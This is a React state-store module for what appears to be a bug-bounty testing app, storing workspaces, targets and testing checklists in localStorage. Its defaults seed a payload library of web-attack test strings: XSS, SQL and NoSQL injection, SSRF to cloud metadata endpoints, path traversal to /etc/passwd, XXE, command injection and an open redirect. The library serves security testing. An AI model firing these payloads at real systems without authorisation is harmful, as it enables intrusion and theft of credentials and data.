import { useEffect, useState } from 'react';

const KEY = 'bbf:v1';

const defaultData = {
  workspace: 'default',
  workspaces: ['default'],
  history: [],
  targets: [],
  scope: [],
  subdomains: [],
  endpoints: [],
  vulns: [],
  notes: [],
  reports: [],
  payloads: [
    { id: 'p1', category: 'XSS', title: 'Basic alert', code: '<script>alert(1)</script>', desc: 'Reflected XSS quick test' },
    { id: 'p2', category: 'XSS', title: 'IMG onerror', code: '<img src=x onerror=alert(document.domain)>', desc: 'Filter bypass via img tag' },
    { id: 'p3', category: 'XSS', title: 'SVG payload', code: '<svg/onload=alert(1)>', desc: 'SVG onload XSS' },
    { id: 'p4', category: 'SQLi', title: 'Auth bypass', code: "' OR '1'='1'-- -", desc: 'Classic auth bypass' },
    { id: 'p5', category: 'SQLi', title: 'Union select', code: "' UNION SELECT NULL,NULL,NULL-- -", desc: 'Column count probing' },
    { id: 'p6', category: 'SQLi', title: 'Time-based blind', code: "' AND SLEEP(5)-- -", desc: 'MySQL time-based detection' },
    { id: 'p7', category: 'SSRF', title: 'AWS metadata', code: 'http://169.254.169.254/latest/meta-data/', desc: 'Cloud metadata exfil (AWS)' },
    { id: 'p8', category: 'SSRF', title: 'GCP metadata', code: 'http://metadata.google.internal/computeMetadata/v1/', desc: 'GCP metadata endpoint' },
    { id: 'p9', category: 'LFI', title: 'Linux passwd', code: '../../../../etc/passwd', desc: 'Path traversal LFI' },
    { id: 'p10', category: 'LFI', title: 'PHP wrapper', code: 'php://filter/convert.base64-encode/resource=index', desc: 'Source disclosure' },
    { id: 'p11', category: 'XXE', title: 'Basic XXE', code: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', desc: 'External entity file read' },
    { id: 'p12', category: 'Cmd Injection', title: 'Bash newline', code: '; id', desc: 'Unix command chaining' },
    { id: 'p13', category: 'Cmd Injection', title: 'Backtick', code: '`whoami`', desc: 'Command substitution' },
    { id: 'p14', category: 'Open Redirect', title: 'Protocol relative', code: '//evil.com', desc: 'Redirect bypass' },
    { id: 'p15', category: 'SSTI', title: 'Jinja2', code: '{{7*7}}', desc: 'Server side template detect' },
    { id: 'p16', category: 'NoSQLi', title: 'Mongo auth bypass', code: '{"$ne": null}', desc: 'Mongo operator injection' }
  ],
  checklists: {
    recon: [
      { id: 'r1', text: 'Enumerate subdomains (amass, subfinder, assetfinder)', done: false },
      { id: 'r2', text: 'Resolve & probe live hosts (httpx)', done: false },
      { id: 'r3', text: 'Port scan (naabu / nmap)', done: false },
      { id: 'r4', text: 'Tech fingerprinting (wappalyzer, whatweb)', done: false },
      { id: 'r5', text: 'Wayback / gau URLs', done: false },
      { id: 'r6', text: 'JS file analysis (linkfinder, secretfinder)', done: false },
      { id: 'r7', text: 'GitHub dorking for leaks', done: false },
      { id: 'r8', text: 'Screenshot all hosts (aquatone, gowitness)', done: false }
    ],
    web: [
      { id: 'w1', text: 'Test auth: weak passwords, brute force, lockout', done: false },
      { id: 'w2', text: 'Session: cookie flags, fixation, predictability', done: false },
      { id: 'w3', text: 'IDOR on all object references', done: false },
      { id: 'w4', text: 'Access control between roles', done: false },
      { id: 'w5', text: 'XSS on every input (reflected, stored, DOM)', done: false },
      { id: 'w6', text: 'SQLi on every parameter', done: false },
      { id: 'w7', text: 'SSRF on URL-accepting parameters', done: false },
      { id: 'w8', text: 'CSRF on state-changing endpoints', done: false },
      { id: 'w9', text: 'File upload bypasses', done: false },
      { id: 'w10', text: 'Rate limiting on sensitive endpoints', done: false },
      { id: 'w11', text: 'Race conditions on critical flows', done: false },
      { id: 'w12', text: 'Subdomain takeover checks', done: false }
    ],
    api: [
      { id: 'a1', text: 'Enumerate endpoints from JS/docs/Swagger', done: false },
      { id: 'a2', text: 'BOLA / IDOR testing', done: false },
      { id: 'a3', text: 'Broken authentication (JWT none, weak secret)', done: false },
      { id: 'a4', text: 'Mass assignment', done: false },
      { id: 'a5', text: 'Excessive data exposure', done: false },
      { id: 'a6', text: 'Rate limit / resource exhaustion', done: false },
      { id: 'a7', text: 'GraphQL introspection & batching', done: false }
    ]
  }
};

function load() {
  try {
    const raw = localStorage.getItem(KEY);
    if (!raw) return structuredClone(defaultData);
    const parsed = JSON.parse(raw);
    return { ...structuredClone(defaultData), ...parsed };
  } catch {
    return structuredClone(defaultData);
  }
}

let state = load();
const listeners = new Set();

export function getState() { return state; }
export function setState(updater) {
  state = typeof updater === 'function' ? updater(state) : updater;
  localStorage.setItem(KEY, JSON.stringify(state));
  listeners.forEach(l => l());
}
export function useStore(selector = s => s) {
  const [, force] = useState(0);
  useEffect(() => {
    const l = () => force(n => n + 1);
    listeners.add(l);
    return () => listeners.delete(l);
  }, []);
  return selector(state);
}
export function uid() { return Math.random().toString(36).slice(2, 10); }

export function exportAll() {
  return JSON.stringify(state, null, 2);
}
export function importAll(json) {
  const data = JSON.parse(json);
  setState({ ...structuredClone(defaultData), ...data });
}
export function resetAll() {
  setState(structuredClone(defaultData));
}

export function logRequest(entry) {
  setState(s => ({
    ...s,
    history: [{ id: uid(), ts: Date.now(), ...entry }, ...s.history].slice(0, 500)
  }));
}

export function switchWorkspace(name) {
  setState(s => ({ ...s, workspace: name }));
}
export function addWorkspace(name) {
  setState(s => s.workspaces.includes(name) ? s : { ...s, workspaces: [...s.workspaces, name], workspace: name });
}
export function deleteWorkspace(name) {
  setState(s => {
    if (s.workspaces.length <= 1) return s;
    const next = s.workspaces.filter(w => w !== name);
    return { ...s, workspaces: next, workspace: next[0] };
  });
}
